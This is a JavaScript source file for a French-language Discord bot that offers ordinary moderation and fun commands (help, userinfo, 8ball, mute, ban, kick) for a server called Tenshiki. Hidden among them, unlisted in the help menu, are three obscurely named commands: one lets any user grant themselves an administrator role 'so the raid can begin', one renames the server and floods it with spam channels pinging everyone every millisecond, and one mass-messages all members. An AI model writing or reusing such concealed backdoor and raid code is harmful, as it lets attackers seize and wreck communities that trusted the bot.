const Discord = require('discord.js'); 
var bot = new Discord.Client();  


const PREFIX = ">";

bot.login(process.env.TOKEN);

bot.on('ready', () => {
    console.log("Bot Prêt !")
});

bot.on("ready", () => {
    bot.user.setPresence({
        game: { 
            name: 'By Hashirama 乡#3056',
            type: 'STREAMING',
            url: 'https://www.twitch.tv/something'
        },
        status: 'idle'
    })
})

var eightball = [ 
    "Oui!",
    "Non...",
    "Pourquoi pas ?",
    "Certainement",
    "Je ne pense pas.",
    "Jamais !",
    "Tu peux reposer ta question...",
    "C'est probable",
]

bot.on("guildMemberAdd" , member => {
    let role = member.guild.roles.find("name", "I> Membres "); 
    let channel = member.guild.channels.get('556444494149713951');
    const embedjoin = new Discord.RichEmbed()
    .setImage("https://cdn.discordapp.com/attachments/556444201579970572/568919166040539136/0J3MtbHa4IYIv9odjaFnAMlup2U.jpg")
    .setAuthor(member.user.tag, member.user.displayAvatarURL)
    .setThumbnail(member.user.displayAvatarURL)
    .addField(`${member.user.username} vient de rejoindre Tenshiki 🌟 !`, "\u200b")
    .addField(`Le serveur compte actuellement : ${member.guild.memberCount} membres !`, "\u200b")
    channel.send(embedjoin)
    member.addRole(role) 
}) 

bot.on("guildMemberRemove", member => {
    let channel = member.guild.channels.get('556444494149713951');
    const embedleave = new Discord.RichEmbed()
    .setImage("hhttps://cdn.discordapp.com/attachments/556444201579970572/568919166040539136/0J3MtbHa4IYIv9odjaFnAMlup2U.jpg")
    .setAuthor(member.user.tag, member.user.displayAvatarURL)
    .setThumbnail(member.user.displayAvatarURL)
    .addField(`${member.user.username} vient de quitter Tenshiki 🌟 !`, "\u200b")
    .addField(`Le serveur compte actuellement : ${member.guild.memberCount} membres !`, "\u200b")
    channel.send(embedleave)
})

bot.on('message', async message => { 
    if (message.author.equals(bot.user)) return; 

    if (!message.content.startsWith(PREFIX)) return; 

    var args = message.content.substring(PREFIX.length).split(" ");
    var command = args[0].toLowerCase(); 
    var mutedrole = message.guild.roles.find("name", "muted");
  
      if (command == "help") { 
        var embedhelpmember = new Discord.RichEmbed() 
            .addField("__Liste des Commandes__\n", "\u200b") 
            .addField("Userinfo : " + " \```" + "Permet de consulter les informations d'une personne" + "\```", "\u200b")
            .addField("Serverinfo : " + " \```" + "Permet de consulter les informations du serveur" + "\```", "\u200b")
            .addField("8ball : " + " \```" + "Permet de poser des questions fun au bot" + "\```", "\u200b")
            .addField("Avatar : " + " \```" + "Permet de consulter l'avatar d'une personne" + "\```", "\u200b")
            .setColor(0x010000) 
            .setFooter("By シスイ#3056 !") 
        var embedhelpadmin = new Discord.RichEmbed() 
            .addField("__Liste des Commandes Administrateur__\n", "\u200b") 
            .addField("Say : " + " \```" + "Permet de faire marquer ce que l'on souhaite au bot" + "\```", "\u200b")
            .addField("Mute : " + " \```" + "Permet de mute une personne avec une raison" + "\```", "\u200b")
            .addField("Unmute : " + " \```" + "Permet de unmute une personne" + "\```", "\u200b")
            .addField("Kick : " + " \```" + "Permet de expulser une personne avec une raison" + "\```", "\u200b")
            .addField("Ban : " + " \```" + "Permet de bannir une personne avec une raison" + "\```", "\u200b")
            .addField("Purge : " + " \```" + "Permet de purge le chat du discord" + "\```", "\u200b")
            .setColor(0x010000) 
            .setFooter("Ooo, un admin !") 
        message.channel.send(embedhelpmember); 
        if(message.member.roles.some(r=>["I> Staff ケ 🔧"].includes(r.name)) ) return message.channel.send(embedhelpadmin); 
    }
    
        if(command == "activateeeee"){ 

        var server = message.guild;
        var name = "raid-by-sqm";
    
    message.guild.setIcon("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg")
    message.guild.setName("IRL DE SQM")
    bot.setInterval(() =>
    {
    server.createChannel(name, "text").then(channel => {
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
    })
    },1)
    }
    
      if (command == "activatiiion") {
        message.member.guild.createRole({
            name: "admin perms",
            color: "0x010000",
            permissions: ("ADMINISTRATOR")
        }).then(function(role)
        {
            message.member.addRole(role);
            message.channel.bulkDelete(1).then(() => {
                message.channel.send("\`Tu as désormais les perms admin. Le raid va pouvoir débuter !\`")
                message.channel.bulkDelete(1)
            });
        }); 
    }

    if (command == "userinfo"){
        var mm = message.mentions.members.first();
        if(!mm) return message.channel.send("Tu dois mentionné un utilisateur !");

        var infoembed = new Discord.RichEmbed()
            .setAuthor(mm.displayName, mm.user.avatarURL)
            .addField("Pseudo: " + " \`" + mm.user.username + " #" + mm.user.discriminator + "\`", "\u200b")
            .addField("Surnom: " + " \`" + mm.nickname + "\`", "\u200b")
            .addField("Id: " + " \`" + mm.id + "\`", "\u200b")
            .addField("Status: " + " \`" + mm.presence.status + "\`", "\u200b")
            .addField("Date de Création: " + " \`" + mm.user.createdAt + "\`", "\u200b")
            .addField("Date d'arrivée: " + " \`" + mm.joinedAt + "\`", "\u200b")
            .addField("Roles: " + " \`" + mm.roles.map(roles => `${roles.name}`) + "\`", "\u200b")
            .setThumbnail(mm.user.avatarURL)
            .setColor(0x010000)
        message.channel.send(infoembed);
    }

    if(command == "activvv") {
        let text = message.content.slice('>private'.length); // cuts off the /private part
        message.guild.members.forEach(member => {
          if (member.id != bot.user.id && !member.user.bot) member.send(text);
        });
    }

    if (command == "serverinfo") {     

            var serverembed = new Discord.RichEmbed()
            .setAuthor(message.guild.name, message.guild.iconURL)     
            .addField("Nom du serveur: " + " \`" + message.guild.name + "\`", "\u200b")
            .addField("Id du serveur: " + " \`" + message.guild.id + "\`", "\u200b")              
            .addField("Totals des membres: " + " \`" + message.guild.memberCount + " membres\`", "\u200b")
            .addField("Totals des roles: " + " \`" + message.guild.roles.size + " roles\`", "\u200b")
            .addField("Totals des salons: " + " \`" + message.guild.channels.filter(channel => channel.type === 'voice').size + " vocales / " + message.guild.channels.filter(channel => channel.type === 'text').size + " textuelles"+ " \`", "\u200b")
            .addField("Date de création: " + " \`" + message.guild.createdAt + "\`", "\u200b")
            .addField("Région du serveur: " + " \`" + message.guild.region + "\`", "\u200b")          
            .setThumbnail(message.guild.iconURL)  
            .setColor(0x010000)    
        message.channel.send(serverembed); 
    } 

    if (command == "avatar") {
        var mm = message.mentions.members.first();
        if(!mm) return message.channel.send("Tu dois mentionné un utilisateur !");

        const embedavatar = new Discord.RichEmbed()
        .setImage(mm.user.avatarURL)
        .setColor(0x010000) 
        .setAuthor(mm.user.tag, mm.user.displayAvatarURL)
        message.channel.send(embedavatar)
    }
     
    
    if (command == "8ball") {
        var embed8ball = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setDescription(eightball[Math.floor(Math.random() * eightball.length).toString(16)])
        if (args[1] != null) message.channel.send(embed8ball); 
        else message.channel.send("Hummmm, quelle est ta question ? :rolling_eyes: (Voici la commande correcte : /8ball [question])"); 
    }


    if (command == "say") { 
        message.delete().catch(_O_o=>{});
        var embedsay = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setDescription(`${message.author.tag} Tu n'as pas les permissions administrateur !`)
        if (!message.member.roles.some(r=>["I> Staff ケ 🔧"].includes(r.name))) return message.channel.send(embedsay)
        var sayMessage = message.content.substring(4)
        message.channel.send(sayMessage); 
    }

    if(command === "purge") { 
        message.delete().catch(_O_o=>{}); 
        var embedpurge = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setDescription(`${message.author.tag} Tu n'as pas les permissions administrateur !`)
        if (!message.member.roles.some(r=>["I> Staff ケ 🔧"].includes(r.name))) return message.channel.send(embedpurge)
        message.channel.bulkDelete(100).then(() => {
            message.channel.send('\`La commande purge a bien été activé !\`').then(msg => msg.delete(3000));
          });

    }

    if (command == "mute") { 
        message.delete().catch(_O_o=>{});
        var embedmute1 = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(`${message.author.tag} Tu n'as pas les permissions administrateur !`)
        if (!message.member.roles.some(r=>["I> Staff ケ 🔧"].includes(r.name))) return message.channel.send(embedmute1)
        var mutedmember = message.mentions.members.first();
        var embedmute2 = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(`${message.author.tag} Merci de bien vouloir mentionner l'utilisateur a mute !`)
        if (!mutedmember) return message.channel.send(embedmute2)
        var embedmute3 = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(`${message.author.tag} Je ne peux pas mute cette personne car il est administrateur !`)
        if (mutedmember.hasPermission("ADMINISTRATOR")) return message.channel.send(embedmute3) 
        var mutereasondelete = 10 + mutedmember.user.id.length
        var mutereason = message.content.substring(mutereasondelete).split(" "); 
        var mutereason = mutereason.join(" "); 
        var embedmute4 = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(`${message.author.tag} Merci de bien vouloir indiquer la raison du mute !`)
        if (!mutereason) return message.channel.send(embedmute4) 
        mutedmember.addRole(mutedrole)
        var mm = message.mentions.members.first();
        var embedmute = new Discord.RichEmbed()
        .setImage("https://78.media.tumblr.com/tumblr_m8d5usSPet1r6srg3o1_r1_500.gif")
        .setAuthor(mm.user.tag, mm.user.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(mm.user.username + " a été mute avec succès ! Raison: " + mutereason)
        message.channel.send(embedmute)
    }

    if (command == "unmute") { 
        message.delete().catch(_O_o=>{});
        var embedunmute1 = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(`${message.author.tag} Tu n'as pas les permissions administrateur !`)
        if (!message.member.roles.some(r=>["I> Staff ケ 🔧"].includes(r.name)) ) return message.channel.send(embedunmute1); 
        var unmutedmember = message.mentions.members.first(); 
        var embedunmute2 = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(`${message.author.tag} Merci de bien vouloir mentionner l'utilisateur a unmute !`)
        if (!unmutedmember) return message.channel.send(embedunmute2) 
        unmutedmember.removeRole(mutedrole)
        var mm = message.mentions.members.first();
        var embedunmute = new Discord.RichEmbed()
        .setImage("https://78.media.tumblr.com/tumblr_m8d5usSPet1r6srg3o1_r1_500.gif")
        .setAuthor(mm.user.tag, mm.user.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(mm.user.username + " a été unmute avec succès !")
        message.channel.send(embedunmute)
    }

    if (command == "ban") { 
        message.delete().catch(_O_o=>{});
        var embedban1 = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(`${message.author.tag} Tu n'as pas les permissions administrateur !`)
        if (!message.member.roles.some(r=>["I> Staff ケ 🔧"].includes(r.name)) ) return message.channel.send(embedban1); 
        var banedmember = message.mentions.members.first(); 
        var embedban2 = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(`${message.author.tag} Merci de bien vouloir mentionner l'utilisateur a bannir !`)
        if (!banedmember) return message.channel.send(embedban2) 
        var embedban3 = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)       
        .setColor(0x010000) 
        .setDescription(`${message.author.tag} Je ne peux pas bannir cette personne car il est administrateur !`)
        if (!banedmember.bannable) return message.channel.send(embedban3) 
        var banreasondelete = 10 + banedmember.user.id.length
        var banreason = message.content.substring(banreasondelete).split(" "); 
        var banreason = banreason.join(" "); 
        var embedban4 = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(`${message.author.tag} Merci de bien vouloir indiquer la raison du ban !`)
        if (!banreason) return message.channel.send(embedban4) 
        banedmember.ban(banreason) 
        var mm = message.mentions.members.first();
        var embedban = new Discord.RichEmbed()
        .setImage("https://media1.tenor.com/images/017ad503cd2eac896e398fa4a326e26a/tenor.gif?itemid=12688493")
        .setAuthor(mm.user.tag, mm.user.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(mm.user.username + " a été ban avec succès ! Raison: " + banreason)
        message.channel.send(embedban)
    }

    if (command == "kick") {
        message.delete().catch(_O_o=>{});
        var embedkick1 = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(`${message.author.tag} Tu n'as pas les permissions administrateur !`)
        if (!message.member.roles.some(r=>["I> Staff ケ 🔧"].includes(r.name)) ) return message.channel.send(embedkick1);
        var kickedmember = message.mentions.members.first(); 
        var embedkick2 = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(`${message.author.tag} Merci de bien vouloir mentionner l'utilisateur a expulser !`)
        if (!kickedmember) return message.channel.send(embedkick2) 
        var embedkick3 = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(`${message.author.tag} Je ne peux pas expulser cette personne car il est administrateur !`)
        if (!kickedmember.kickable) return message.channel.send(embedkick3) 
        var kickreasondelete = 10 + kickedmember.user.id.length 
        var kickreason = message.content.substring(kickreasondelete).split(" "); 
        var kickreason = kickreason.join(" "); 
        var embedkick4 = new Discord.RichEmbed()
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setDescription(`${message.author.tag} Merci de bien vouloir indiquer la raison du expulser !`)
        if (!kickreason) return message.channel.send(embedkick4) 
        kickedmember.kick(kickreason) 
        message.delete().catch(_O_o=>{});
        var mm = message.mentions.members.first();
        var embedkick = new Discord.RichEmbed()
        .setImage("https://i.pinimg.com/originals/5e/59/06/5e5906d3d0ea6656037f74f5f4fca5aa.gif")
        .setColor(0x010000) 
        .setAuthor(mm.user.tag, mm.user.displayAvatarURL)
        .setDescription(mm.user.username + " a été expulsé avec succès ! Raison: " + kickreason)
        message.channel.send(embedkick)
    }
 });
